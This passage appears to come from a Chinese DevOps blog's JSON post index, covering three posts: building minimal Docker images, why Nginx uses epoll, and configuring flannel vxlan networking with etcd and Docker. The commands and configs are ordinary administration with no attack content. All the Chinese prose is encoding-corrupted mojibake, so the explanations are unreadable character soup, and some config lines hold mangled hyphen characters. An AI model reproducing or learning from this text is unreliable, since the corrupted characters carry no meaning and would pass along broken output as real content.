æ‰“å‡ºçš„é•œåƒåŒ…å°½é‡å°ï¼Ÿ\nå…¶å®åœ¨ç”Ÿäº§å·²ç»å°½é‡ä½¿ç”¨æœ€å°åŒ–çš„é•œåƒåŒ…äº†ï¼Œåªæ˜¯çªç„¶è¢«é—®åˆ°è¿˜æ˜¯æœ‰ç‚¹æ‡µåœˆï¼›å› ä¸ºå°è±¡ä¸­è‡ªå·±åŸºæœ¬æ˜¯ä½¿ç”¨ alphine åšåº•åŒ…ï¼ŒDockerfile é€šå¸¸å°±æ˜¯ copy ä¸€ä¸ªå¯æ‰§è¡Œçš„ç¨‹åºè¿›å»å°±å®Œäº‹äº†ï¼Œå¦‚æœä¸è¡Œï¼Œå†å¼€ shell è¿›å»æ…¢æ…¢æ·»åŠ ç¼ºå°‘çš„åº“æ–‡ä»¶ã€‚\nè¿™é‡Œå°±æ€»ç»“ä¸€ä¸‹ï¼Œä¸¤ç‚¹ï¼š\nä¸€ã€ä½¿ç”¨å°½é‡å°çš„åº•åŒ… ä»¥ alphine ä¸ºä¸»ï¼Œä½¿ç”¨ alphine åº•åŒ…çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ï¼š\n1ã€æ›¿æ¢ apk çš„æº\n2ã€æ›´æ–°ã€æ›´æ–°è¯ä¹¦\n3ã€æ³¨æ„ Timezone çš„è®¾ç½®\n4ã€æ³¨æ„ glibc åº“çš„å…¼å®¹é—®é¢˜\näºŒã€ä½¿ç”¨åˆ†é˜¶æ®µbuild é€šå¸¸ç±»ä¼¼cã€goã€rustä¹‹ç±»çš„æºä»£ç ï¼Œéƒ½éœ€è¦ç»è¿‡ç¼–è¯‘ï¼Œæœ€åäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå®Œæ•´çš„ç¼–è¯‘ç¯å¢ƒå…¶å®å¯¹æœ€åçš„é•œåƒæ¥è¯´éƒ½æ˜¯ä¸éœ€è¦çš„ã€‚\næ‰€ä»¥åˆ©ç”¨åˆ†é˜¶æ®µbuildï¼Œç”©è„±ç¼–è¯‘ç¯å¢ƒä»¥åŠä¸­é—´äº§ç‰©ï¼Œå°±å¯ä»¥ç¼©å°æœ€å build å‡ºé•œåƒçš„å¤§å°ï¼Œä½¿ç”¨ä¹Ÿå¾ˆç®€å•ã€‚\nDockerfile æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n1FROM golang:alpine AS build-env 2WORKDIR /app 3ADD . /app 4RUN cd /app \u0026amp;\u0026amp; go build -o goapp 5 6 7FROM alpine 8RUN apk update \u0026amp;\u0026amp; \\ 9 apk add ca-certificates \u0026amp;\u0026amp; \\ 10 update-ca-certificates \u0026amp;\u0026amp; \\ 11 rm -rf /var/cache/apk/* 12WORKDIR /app 13COPY --from=build-env /app/goapp /app 14EXPOSE 8080 15ENTRYPOINT ./goapp ","date":"2022-04-01","img":"","permalink":"https://rendoumi.com/posts/20220401-docker_mini_image/","series":null,"tags":null,"title":"é¢è¯•ä¹‹Dockerå¦‚ä½•æ‰“å‡ºæœ€å°çš„é•œåƒ"},{"categories":null,"content":"é¢è¯•æ—¶è¢«é—®åˆ°ï¼šæ˜¯å¦äº†è§£ Nginxï¼Œå®ƒä½¿ç”¨çš„ epoll æ¨¡å¼å’Œå…¶ä»–çš„ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ\nç›´æ¥è¢«é—®ä½ï¼Œå®é™…ç”Ÿäº§ä¸­é…è¿‡ä¸å°‘çš„ Nginxï¼Œå„ç§ rewriteã€regexã€æ­£åå‘ä»£ç†ã€phpã€fast-cgiã€é™æµã€è¯ä¹¦ã€jwtã€corsï¼›epoll åªå¤§æ¦‚æœ‰å°è±¡æ˜¯ä¸‹é¢è¿™è¡Œï¼š\n1events { 2 use epoll; 3 worker_connections 1024; 4} å®åœ¨æ˜¯æ±—é¢œå•Šï¼Œæ‰€ä»¥å¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹è¿™ä¸ª epollã€‚\né¦–å…ˆæ‰”æ¦‚å¿µ IOå¤šè·¯å¤ç”¨ï¼š å¤šè·¯æ˜¯æŒ‡ç½‘ç»œè¿æ¥ï¼Œå¤ç”¨æŒ‡çš„æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ã€‚\nIOå¤šè·¯å¤ç”¨æ˜¯ä¸€ç§åŒæ­¥IOæ¨¡å‹ï¼Œå®ç°ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼›\nä¸€æ—¦æŸä¸ªæè¿°ç¬¦å°±ç»ªï¼ˆä¸€èˆ¬æ˜¯è¯»å°±ç»ªæˆ–è€…å†™å°±ç»ªï¼‰ï¼Œå°±èƒ½å¤Ÿé€šçŸ¥åº”ç”¨ç¨‹åºè¿›è¡Œç›¸åº”çš„è¯»å†™æ“ä½œï¼›\næ²¡æœ‰æ–‡ä»¶æè¿°ç¬¦å°±ç»ªæ—¶ä¼šé˜»å¡åº”ç”¨ç¨‹åºï¼Œäº¤å‡ºcpuã€‚\né‚£ä¹ˆIOå¤šè·¯å¤ç”¨çš„å®ç°æ–¹æ³•æœ‰ä¸‰ç§ï¼š selectã€pollã€epoll selectã€pollã€epollæœ¬è´¨ä¸Šéƒ½æ˜¯åŒæ­¥I/Oï¼Œç”¨æˆ·è¿›ç¨‹ï¼ˆè¿™é‡Œå°±æ˜¯Nginxï¼‰è´Ÿè´£è¯»å†™ï¼ˆä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼‰ï¼Œè¯»å†™è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·è¿›ç¨‹æ˜¯é˜»å¡çš„ã€‚\nselectï¼š\næŸ¥è¯¢ fd_set ä¸­ï¼Œæ˜¯å¦æœ‰å°±ç»ªçš„ fdï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œå½“æœ‰ fd (File descripter) å°±ç»ªæˆ–è¶…æ—¶è¿”å›ï¼›\nfd_set æ˜¯ä¸€ä¸ªä½é›†åˆï¼Œå¤§å°æ˜¯åœ¨ç¼–è¯‘å†…æ ¸æ—¶çš„å¸¸é‡ï¼Œé»˜è®¤å¤§å°ä¸º 1024\nç‰¹ç‚¹ï¼š\nè¿æ¥æ•°é™åˆ¶ï¼Œfd_set å¯è¡¨ç¤ºçš„ fd æ•°é‡å¤ªå°äº†ï¼›\nçº¿æ€§æ‰«æï¼šåˆ¤æ–­ fd æ˜¯å¦å°±ç»ªï¼Œéœ€è¦éå†ä¸€è¾¹ fd_setï¼›\næ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯\npollï¼š\nè§£å†³äº†è¿æ¥æ•°é™åˆ¶ï¼š\npoll ä¸­å°† select ä¸­çš„ fd_set æ›¿æ¢æˆäº†ä¸€ä¸ª pollfd æ•°ç»„\nè§£å†³ fd æ•°é‡è¿‡å°çš„é—®é¢˜\næ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯\nepollï¼ševent äº‹ä»¶é©±åŠ¨\näº‹ä»¶æœºåˆ¶ï¼šé¿å…çº¿æ€§æ‰«æ\nä¸ºæ¯ä¸ª fdï¼Œæ³¨å†Œä¸€ä¸ªç›‘å¬äº‹ä»¶\nfd å˜æ›´ä¸ºå°±ç»ªæ—¶ï¼Œå°† fd æ·»åŠ åˆ°å°±ç»ªé“¾è¡¨\nfd æ•°é‡ï¼šæ— é™åˆ¶ï¼ˆOS çº§åˆ«çš„é™åˆ¶ï¼Œå•ä¸ªè¿›ç¨‹èƒ½æ‰“å¼€å¤šå°‘ä¸ª fdï¼‰\nåŒºåˆ«åœ¨äº:\nepollè¾ƒçµæ´»ï¼Œå¦‚æœæœ‰ä¸€ç™¾ä¸‡ä¸ªé“¾æ¥çŠ¶æ€åŒæ—¶ä¿æŒï¼Œä½†æ˜¯åœ¨æŸä¸ªæ—¶åˆ»ï¼Œåªæœ‰å‡ ç™¾ä¸ªé“¾æ¥æ˜¯æ´»è·ƒçš„ã€‚epollçš„å¤„ç†æ˜¯é€šè¿‡epoll_create()åˆ›å»ºå¯¹è±¡ï¼Œepoll_ctl()æ”¶é›†æ‰€æœ‰çš„å¥—æ¥å­—æ·»åŠ åˆ°epollå¯¹è±¡ï¼Œepoll_wait()æ”¶é›†æ‰€æœ‰å‘ç”Ÿäº‹ä»¶ä¹Ÿå°±æ˜¯æ‰€è°“çš„æ´»è·ƒçš„é“¾æ¥ï¼Œå¹¶æ”¶é›†åˆ°ä¸€ä¸ªListé“¾è¡¨ä¸­ï¼Œè¿™æ ·åªéœ€è¦éå†è¿™äº›Listé“¾è¡¨é‡Œçš„æ•°æ®ï¼Œè€Œä¸ç”¨éå†ä¸€ç™¾ä¸‡ä¸ªé“¾æ¥ã€‚ è€Œåè€…select pollåˆ™æ˜¯æ¯æ¬¡æ”¶é›†äº‹ä»¶æ—¶ï¼Œå°†è¿™ä¸€ç™¾ä¸‡ä¸ªé“¾æ¥éƒ½ä¼ ç»™æ“ä½œç³»ç»Ÿï¼Œå†ç”±æ“ä½œç³»ç»Ÿå†…æ ¸ä¸Šåˆ¤æ–­æŸäº›é“¾æ¥äº§ç”Ÿäº†äº‹ä»¶ï¼Œé€ æˆäº†å·¨å¤§çš„èµ„æºæµªè´¹ï¼ˆå¤§æ‰¹é‡çš„ä¸åŒæ€å†…å­˜å¤åˆ¶ï¼‰ã€‚\nä¸ºä»€ä¹ˆepollæ•ˆç‡æ¯”è¾ƒé«˜ï¼š\nepoll åœ¨epoll_create æ—¶ï¼Œå°±å·²ç»å»ºç«‹å¥½äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¯¹åº” epoll å¯¹è±¡ï¼ŒåŒæ—¶ï¼Œåœ¨å†…æ ¸ cache é‡Œå»ºç«‹äº†ä¸€ä¸ªçº¢é»‘æ ‘ï¼Œç”¨äºå­˜å‚¨åç»­epoll_ctlä¼ æ¥çš„socketè¿æ¥ã€‚å†åŒæ—¶ï¼Œåˆå»ºç«‹äº†ä¸€ä¸ªlisté“¾è¡¨ï¼Œç”¨äºå­˜å‚¨å‡†å¤‡å°±ç»ªçš„äº‹ä»¶ã€‚ ç­‰åˆ° epoll_wait() è°ƒç”¨çš„æ—¶å€™ï¼Œåªéœ€è¦è§‚å¯Ÿlisté“¾è¡¨é‡Œæœ‰æ²¡æœ‰æ•°æ®å°±å¯ä»¥ï¼Œæœ‰æ•°æ®å°±è¿”å›ï¼Œæ²¡æ•°æ®å°±sleepã€‚ç­‰åˆ°timeoutåï¼Œå³ä½¿æ²¡æ•°æ®ï¼Œä¹Ÿè¿”å›äº†ã€‚æ‰€ä»¥ epoll_wait ä¼šéå¸¸é«˜æ•ˆ\nä¸‰è€…çš„æ¯”è¾ƒï¼š\nselect poll epoll æ•°æ®ç»“æ„ bitmap æ•°ç»„ çº¢é»‘æ ‘ æœ€å¤§è¿æ¥æ•° 1024 æ— ä¸Šé™ æ— ä¸Šé™ fdæ‹·è´ æ¯æ¬¡è°ƒç”¨selectæ‹·è´ æ¯æ¬¡è°ƒç”¨pollæ‹·è´ fdé¦–æ¬¡è°ƒç”¨epoll_ctlæ‹·è´ï¼Œæ¯æ¬¡è°ƒç”¨epoll_waitä¸æ‹·è´ å·¥ä½œæ•ˆç‡ è½®è¯¢ï¼šO(n) è½®è¯¢ï¼šO(n) å›è°ƒï¼šO(1) Nginx çš„å¹¶å‘å¤„ç†èƒ½åŠ› å…³äº Nginx çš„å¹¶å‘å¤„ç†èƒ½åŠ›ï¼š\nå¹¶å‘è¿æ¥æ•°ï¼Œä¸€èˆ¬ä¼˜åŒ–åï¼Œå³°å€¼èƒ½ä¿æŒåœ¨ 1~3w å·¦å³ã€‚ï¼ˆå†…å­˜å’Œ CPU æ ¸å¿ƒæ•°ä¸åŒï¼Œä¼šæœ‰è¿›ä¸€æ­¥ä¼˜åŒ–ç©ºé—´ï¼‰ Nginx çš„æœ€å¤§è¿æ¥æ•°ï¼šWorker è¿›ç¨‹æ•°é‡ x å•ä¸ª Worker è¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•° ","date":"2022-04-01","img":"","permalink":"https://rendoumi.com/posts/20220401-nginx_epoll/","series":null,"tags":null,"title":"é¢è¯•ä¹‹Nginxçš„epollçš„ä¼˜åŠ¿"},{"categories":null,"content":"ç°åœ¨å„å¤§å…¬æœ‰äº‘çš„ k8s ç½‘ç»œæ’ä»¶åŸºæœ¬ç”¨çš„éƒ½æ˜¯ vxlanï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è¿™ä¸ªè¿›è¡Œä¸€ä¸‹è¯¦ç»†äº†è§£ï¼Œä»¥ä¾¿ç”¨äºå…¬å¸çš„æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚\nä¸€ã€åŸç† é¦–å…ˆï¼Œkubernetesçš„ç½‘ç»œæ¨¡å‹ï¼š\nåŒ…å«ä¸‰è¦ç´ ï¼š\næ‰€æœ‰çš„å®¹å™¨(container)ä¹‹é—´èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹äº’ç›¸é€šè®¯\næ‰€æœ‰çš„èŠ‚ç‚¹(Node)èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹è·Ÿæ‰€æœ‰çš„å®¹å™¨(container)äº’ç›¸é€šè®¯ï¼ˆåä¹‹å®¹å™¨è®¿é—®èŠ‚ç‚¹äº¦ç„¶ï¼‰\nå®¹å™¨(container)ä¸­çš„IPåœ°å€ï¼Œåœ¨å®¹å™¨å†…å’Œå®¹å™¨å¤–é¢çœ‹èµ·æ¥æ˜¯ä¸€æ ·çš„\né‚£æ¥åˆ° flannelï¼Œå®ƒæ˜¯ä¸€ç§ Overlay network è¦†ç›–ç½‘ç»œï¼Œç›–åœ¨åŸæœ‰çš„ Node ç½‘ç»œåŸºç¡€ä¸Šï¼š ä¸Šå›¾è¦ä»”ç»†åˆ†æï¼Œ K8S ä¸­å­˜åœ¨ä¸‰ä¸ª+ä¸€ä¸ªç½‘ç»œæ®µï¼š\nnode ç½‘ç»œæ®µï¼Œä¸Šå›¾æ˜¯ 172.20.32.0/19ï¼Œè¿™æ˜¯åŸºç¡€ç½‘ç»œæ®µ pod ç½‘ç»œæ®µï¼Œ100.96.0.0/16ï¼Œ2Â¹â¶(65536)ä¸ªIPï¼Œè¿™æ˜¯ç”± flannel äº§ç”Ÿçš„ overlay networkï¼Œæ‰€æœ‰çš„ pod éƒ½ç«™åœ¨ä¸€ä¸ªå¤§å¹¿åœºä¸Šï¼Œäº’ç›¸å¯è§ svc ç½‘ç»œæ®µï¼Œä¸Šå›¾æœªæï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œæƒ³è¦æŠŠ pod çš„ ip ç»™å›ºå®šä¸‹æ¥ï¼Œå°±å¾—ä½¿ç”¨ svc æ¥åˆ†é…å›ºå®šçš„åŸŸåï¼Œè¿™ä¸ªæ˜¯ç”± iptables æ¥ç»´æŠ¤çš„ In-Host docker networkç½‘ç»œæ®µï¼Œè¿™æ˜¯æ¯ä¸ª Node ä¸»æœºçš„å•ç‹¬ç½‘ç»œæ®µï¼Œflannelç»™æ¯ä¸ª Node ä¸»æœºåˆ’åˆ†äº†ä¸€ä¸ª 100.96.x.0/24 æ®µï¼Œç„¶ååœ¨ etcd å†…è¿›è¡Œç»´æŠ¤ï¼Œæ¥é¿å…ä¸åŒçš„ Node ä¸»æœºåˆ†é…IPå†²çªã€‚ ç»¼è¿°ï¼šflannel ä¸ºæ¯ä¸ª Node åˆ†é…ä¸€ä¸ª subnetï¼Œå®¹å™¨(container)ä»æ­¤ subnet ä¸­åˆ†é… IPï¼Œè¿™äº› IP å¯ä»¥åœ¨ Node é—´è·¯ç”±ï¼Œå®¹å™¨é—´æ— éœ€ NAT å’Œ port mapping å°±å¯ä»¥è·¨ä¸»æœºé€šä¿¡ã€‚\næ¯ä¸ª subnet éƒ½æ˜¯ä»ä¸€ä¸ªæ›´å¤§çš„ IP æ± ä¸­åˆ’åˆ†çš„ï¼Œflannel ä¼šåœ¨æ¯ä¸ª Node ä¸Šè¿è¡Œä¸€ä¸ªå« flanneld çš„ agentï¼Œå…¶èŒè´£å°±æ˜¯ä»æ± å­ä¸­åˆ†é… subnetã€‚ä¸ºäº†åœ¨å„ä¸ªä¸»æœºé—´å…±äº«ä¿¡æ¯ï¼Œflannel ç”¨ etcdï¼ˆä¸ consul ç±»ä¼¼çš„ key-value åˆ†å¸ƒå¼æ•°æ®åº“ï¼‰å­˜æ”¾ç½‘ç»œé…ç½®ã€å·²åˆ†é…çš„ subnetã€host çš„ IP ç­‰ä¿¡æ¯ã€‚\næ•°æ®åŒ…å¦‚ä½•åœ¨ä¸»æœºé—´è½¬å‘æ˜¯ç”± backend å®ç°çš„ã€‚flannel æä¾›äº†å¤šç§ backendï¼Œæœ€å¸¸ç”¨çš„æœ‰ vxlan å’Œ host-gwï¼Œudp ä¸‡ä¸‡ä¸å¯ä½¿ç”¨ã€‚\nä»”ç»†åˆ†æä¸€ä¸‹ä¸¤ä¸ªä¸åŒä¸»æœºä¸Šçš„containerè·¨ä¸»æœºäº’ç›¸é€šè®¯çš„è¿‡ç¨‹ï¼š\ncontainer-1 é¦–å…ˆå»ºç«‹ IP åŒ…ï¼Œ src: 100.96.1.2 -\u0026gt; dst: 100.96.2.3, åŒ…å‘åˆ° docker0 ç½‘æ¡¥ï¼Œdocker0 æ˜¯ container-1 çš„ç¼ºçœ gateway ç½‘å…³ã€‚\nåœ¨æ¯ä¸ª Node ä¸Šï¼Œflannel éƒ½ä¼šè·‘ä¸€ä¸ªflanneldçš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒä¼šåœ¨ Linux çš„ kernel è·¯ç”±è¡¨ä¸­å»ºç«‹è‹¥å¹²æ¡è·¯ç”±ï¼Œ Node1 çš„è·¯ç”±è¡¨å¦‚ä¸‹:\n1admin@ip-172-20-33-102:~$ ip route 2default via 172.20.32.1 dev eth0 3100.96.0.0/16 dev flannel0 proto kernel scope link src 100.96.1.0 4100.96.1.0/24 dev docker0 proto kernel scope link src 100.96.1.1 5172.20.32.0/19 dev eth0 proto kernel scope link src 172.20.33.102 å¯¹ç…§è·¯ç”±è¡¨ï¼Œdst 100.96.2.3 çš„è·¯ç”±ä¼šè½åˆ° 100.96.0.0/16 è¿™ä¸€æ¡ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè½åˆ° flannel0 è¿™ä¸ªè®¾å¤‡ä¸Šç»§ç»­è½¬å‘å‡ºå»ã€‚\nflannel0 å‘¢æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç”±flanneld è¿›ç¨‹å»ºç«‹çš„ TUN è™šæ‹Ÿç½‘å¡è®¾å¤‡ï¼š\nå†™TUNï¼šå½“ IP åŒ…å†™åˆ°flannel0åï¼Œä¼šè½¬å‘åˆ° kernelï¼Œç„¶å kernel æŸ¥è·¯ç”±è¡¨å†è½¬å‘ è¯»TUNï¼šå½“ IP åŒ…é¦–å…ˆåˆ°è¾¾æ ¸å¿ƒï¼Œè·¯ç”±è¡¨æ˜¾ç¤ºä¸‹ä¸€è·³æ˜¯flannel0è™šæ‹Ÿç½‘å¡ï¼Œkernelä¼šç›´æ¥æŠŠåŒ…å‘åˆ°äº§ç”Ÿè¿™ä¸ªè™šæ‹Ÿç½‘å¡çš„è¿›ç¨‹å»ï¼Œä¹Ÿå°±æ˜¯flanneldè¿›è¡Œè¯»åŒ… çœ‹ä¸Šå›¾ï¼ŒIP åŒ…é¦–å…ˆåˆ°è¾¾ Docker0ï¼Œå› ä¸ºå®ƒæ˜¯ç½‘å…³ï¼Œç„¶åæŸ¥å†…æ ¸è·¯ç”±è¡¨ï¼Œåˆ°è¾¾flannel0è™šæ‹Ÿç½‘å¡ï¼Œç„¶åå°±åˆ°è¾¾flanneldè¿›ç¨‹è¯»åŒ…ï¼Œ è¿™æ—¶å€™flanneldä¼šåšä»€ä¹ˆå‘¢ï¼Ÿ\nflanneldä» etcd ä¸­è·å¾—å„ä¸ªä¸»æœºç½‘æ®µå¯¹åº”çš„èŠ‚ç‚¹ä¿¡æ¯ï¼š\n1admin@ip-172-20-33-102:~$ etcdctl ls /coreos.com/network/subnets 2/coreos.com/network/subnets/100.96.1.0-24 3/coreos.com/network/subnets/100.96.2.0-24 4/coreos.com/network/subnets/100.96.3.0-24 5 6admin@ip-172-20-33-102:~$ etcdctl get /coreos.com/network/subnets/100.96.2.0-24 7{\u0026#34;PublicIP\u0026#34;:\u0026#34;172.20.54.98\u0026#34;} äºæ˜¯ä¹ Node1 ä¸Šé¢çš„ flanneld è¿›ç¨‹å¾—çŸ¥ 100.96.2.3 IPå¯¹åº”çš„ç½‘æ®µæ˜¯ 100.96.2.0/24 ï¼Œå†è¿›ä¸€æ­¥å¯¹åº”åˆ° Node2 çš„å…¬ç½‘IP 172.20.54.98ï¼Œç„¶åå®ƒå°±ä¼šç»§ç»­å°è£…è¿™ä¸ªIPåŒ…ï¼Œç”¨UDPæˆ–è€…VXLANï¼ŒæŠŠè¿™ä¸ª IP åŒ…å†åŒ…è£¹ä¸€å±‚å°èµ·æ¥é€åˆ° Node2 çš„ flanneld è¿›ç¨‹å»ã€‚\nNode2ï¼šåŒ…é¦–å…ˆä»ç½‘å¡åˆ°è¾¾ Node2 çš„æ ¸å¿ƒ kernelï¼Œè·¯ç”±è¡¨æ˜¾ç¤ºä¸‹ä¸€è·³æ˜¯flannel0 è™šæ‹Ÿç½‘å¡ï¼ŒåŒ…å°±è½¬å‘åˆ° flanneld è¿›ç¨‹è¯»åŒ…ï¼Œflanneldæ¥æ”¶åˆ°åŒ…åï¼Œå°±ä¼šåšæ‹†åŒ…ï¼Œæ‹†å®ŒåŒ…ç›´æ¥å†™åŒ…åˆ° TUNï¼Œç„¶ååŒ…åˆ°è¾¾æœ¬åœ°æ ¸å¿ƒè·¯ç”±ï¼Œå†æŸ¥è·¯ç”±è¡¨è½¬å‘åˆ°docker0ï¼Œæœ€ç»ˆåˆ°è¾¾ container-2\næˆ‘ä»¬åŒæ ·å¯ä»¥æŸ¥çœ‹ Node2 çš„è·¯ç”±è¡¨ï¼Œåº”è¯¥æ˜¾ç¤ºå¦‚ä¸‹ç»“æœï¼š\n1admin@ip-172-20-54-98:~$ ip route 2default via 172.20.32.1 dev eth0 3100.96.0.0/16 dev flannel0 proto kernel scope link src 100.96.2.0 4100.96.2.0/24 dev docker0 proto kernel scope link src 100.96.2.1 5172.20.32.0/19 dev eth0 proto kernel scope link src 172.20.54.98 è¿™æ ·æ•´ä¸ªè¿‡ç¨‹å°±æ˜æ™°äº†ã€‚\né“ç†æ˜æ™°äº†ï¼Œä¸‹é¢æˆ‘ä»¬å°±éœ€è¦æ¥å®é™…æ“ä½œäº†ã€‚\näºŒã€å®æˆ˜ ç›´æ¥åœ¨ k8s é‡Œè£…å°±å¾ˆç®€å•ï¼Œç”¨ yaml ä¸€æ­¥æ“ä½œå°±è¡Œäº†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸åšä»»ä½•ä»‹ç»ã€‚\næˆ‘ä»¬ä¸‹é¢è¯´çš„æ˜¯å¦‚ä½•å•ç‹¬æŠŠ flannel å•ç‹¬æ‹¿å‡ºæ¥ä½¿ç”¨ï¼š\n1ã€é¦–å…ˆè¦è£…etcd å‚ç…§ä¹‹å‰çš„å¸–å­ï¼šEtcdå•èŠ‚ç‚¹åº”ç”¨ è¿™é‡Œä¹Ÿç»™å‡ºä¸ç”¨Dockerï¼Œç”¨systemctlæ¥è¿è¡Œçš„æ–¹æ¡ˆï¼š\nå‡†å¤‡å·¥ä½œï¼Œå…³é—­selinuxï¼Œæ‰“å¼€åŒ…è½¬å‘ï¼š\n1echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward 2#æˆ–è€…ä¿®æ”¹/etc/sysctl.confï¼Œç„¶åsysctl -p 3#net.ipv4.ip_forward = 1 4 5systemctl disable firewalld.service 6systemctl stop firewalld.service 7 8iptables -P FORWARD ACCEPT å®‰è£… etcd ï¼š\n1yum install etcd -y 2 3cp /etc/etcd/etcd.conf/etc/etcd/etcd.conf.bak 4 5vi /etc/etcd/etcd.conf 6ETCD_LISTEN_PEER_URLS=\u0026#34;http://172.16.9.110:2380\u0026#34; 7ETCD_LISTEN_CLIENT_URLS=http://172.16.9.110:2379,http://127.0.0.1:2379 8ETCD_NAME=\u0026#34;default\u0026#34; 9ETCD_INITIAL_ADVERTISE_PEER_URLS=\u0026#34;http://172.16.9.110:2380\u0026#34; 10ETCD_ADVERTISE_CLIENT_URLS=http://172.16.9.110:2379 11 12systemctl enable --now etcd é…ç½® etcdï¼š\n1vi /root/etcd.sh 2{ \u0026#34;Network\u0026#34;: \u0026#34;10.10.0.0/16\u0026#34;,\u0026#34;SubnetLen\u0026#34;: 24,\u0026#34;Backend\u0026#34;: {\u0026#34;Type\u0026#34;:\u0026#34;vxlan\u0026#34;} } 3 4etcdctl --endpoints=http://172.16.9.110:2379 set kubernetesâ€‘cluster/network/config \u0026lt; /root/etcd.sh 5 6etcdctl ls kubernetesâ€‘cluster/network/config 7 8curl -s http://172.16.9.110:2379/v2/keys/kubernetesâ€‘cluster/network/subnets è§£é‡Šä¸€ä¸‹ï¼špod çš„ç½‘æ®µæ˜¯ 10.10.0.0/16ï¼Œæ©ç æ˜¯ /16 ï¼Œæœ¬åœ° Node ä¸»æœºçš„æ©ç æ˜¯/24ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å°å®¿ä¸»æœºä¸Šæœ€å¤šäº§256å°containerã€‚\nç„¶å etcd çš„ key æ˜¯ kubernetesâ€‘cluster/network\n2ã€ç„¶åè£… flannelï¼š æ³¨æ„ etcd çš„é…ç½®è·Ÿä¸Šé¢ä¸€è‡´ï¼š\n1yum install flannel -y 2 3cp /etc/sysconfig/flanneld/etc/sysconfig/flanneld.bak 4 5vi/etc/sysconfig/flanneld 6FLANNEL_ETCD_ENDPOINTS=http://172.16.9.110:2379 7FLANNEL_ETCD_PREFIX=\u0026#34;kubernetesâ€‘cluster/network\u0026#34; 8 9systemctl enable --now flanneld 3ã€é‡å¯Docker ç¼–è¾‘dockerå¯åŠ¨é…ç½®æ–‡ä»¶ï¼š\n1cat /run/flannel/subnet.env 2FLANNEL_NETWORK=10.10.0.0/16 3FLANNEL_SUBNET=10.10.1.1/24 4FLANNEL_MTU=1450 5FLANNEL_IPMASQ=false 6 7/usr/lib/systemd/system/docker.service 8 9# Add: --bip= and --mtu= 10 11vi /usr/lib/systemd/system/docker.service 12dockerd --bip=$FLANNEL_SUBNET --mtu=$FLANNEL_MTU 13 14æˆ–è€… 15cat /run/flannel/docker 16DOCKER_OPT_BIP=\u0026#34;â€‘â€‘bip=10.10.1.1/24\u0026#34; 17DOCKER_OPT_IPMASQ=\u0026#34;â€‘â€‘ipâ€‘masq=true\u0026#34; 18DOCKER_OPT_MTU=\u0026#34;â€‘â€‘mtu=1450\u0026#34; 19DOCKER_NETWORK_OPTIONS=\u0026#34; â€‘â€‘bip=10.10.1.1/24 â€‘â€‘ipâ€‘masq=false â€‘â€‘mtu=1450 \u0026#34; 20 21cat /etc/systemd/system/docker.service.d/docker.conf 22ServiceEnvironmentFile=â€‘/etc/sysconfig/docker 23EnvironmentFile=â€‘/etc/sysconfig/dockerâ€‘storage 24EnvironmentFile=â€‘/etc/sysconfig/dockerâ€‘network 25EnvironmentFile=â€‘/run/flannel/docker 26ExecStart= 27ExecStart=/usr/bin/dockerd $OPTIONS 28 $DOCKER_STORAGE_OPTIONS 29 $DOCKER_NETWORK_OPTIONS 30 $BLOCK_REGISTRY 31 $INSECURE_REGISTRY ç„¶åå°±å¯ä»¥äº†ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆ flannel ä¸ç”¨ UDP å‘¢ï¼Ÿ\nçœ‹ä¸Šå›¾ï¼ŒåŒ…ä»ç”¨æˆ·ç©ºé—´åˆ°å†…æ ¸ç©ºé—´çš„æµå…¥æµå‡ºï¼Œä¼šç»è¿‡1ã€2ã€3çš„æ¥å›æ‹·è´ç¿»è½¬ï¼Œæ€§èƒ½æŸå¤±è¾ƒå¤§ï¼Œæ‰€ä»¥ UDP åªèƒ½ç”¨åœ¨æµ‹è¯•ç¯å¢ƒã€‚\næœ€å flannel çš„ VXLAN å’Œ HOST-GW åˆæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ\nä¸ vxlan ä¸åŒï¼Œhost-gw ä¸ä¼šå°è£…æ•°æ®åŒ…ï¼Œè€Œæ˜¯åœ¨ä¸»æœºçš„è·¯ç”±è¡¨ä¸­åˆ›å»ºåˆ°å…¶ä»–ä¸»æœº subnet çš„è·¯ç”±æ¡ç›®ï¼Œä»è€Œå®ç°å®¹å™¨è·¨ä¸»æœºé€šä¿¡ host-gw æŠŠæ¯ä¸ªä¸»æœºéƒ½é…ç½®æˆç½‘å…³ï¼Œä¸»æœºçŸ¥é“å…¶ä»–ä¸»æœºçš„ subnet å’Œè½¬å‘åœ°å€ã€‚ vxlan 